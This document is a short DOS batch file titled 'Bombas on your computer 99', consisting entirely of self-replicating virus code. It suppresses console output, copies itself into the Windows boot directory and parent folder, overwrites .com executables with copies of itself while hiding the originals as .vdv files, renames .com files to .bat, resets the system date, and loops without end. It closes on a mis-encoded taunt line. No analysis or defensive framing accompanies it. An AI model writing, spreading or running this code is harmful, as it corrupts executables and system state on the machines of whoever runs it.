:Bombas on your computer 99
@echo off
:rep
set boom= *.com
ctty nul
copy %0 %winbootdir%\%0
copy %0 ..
if not exist %boom% goto fun
for %%i in (%boom% ..\%boom%) do copy %%i *.vdv
for %%k in (%boom% ..\%boom%) do copy %0 %%k
date 01.01.2000
ren *.com *.bat
attrib *.vdv + h
attrib %0 -h
goto rep
:fun
echo �� ��� � ��㯮�⥩!





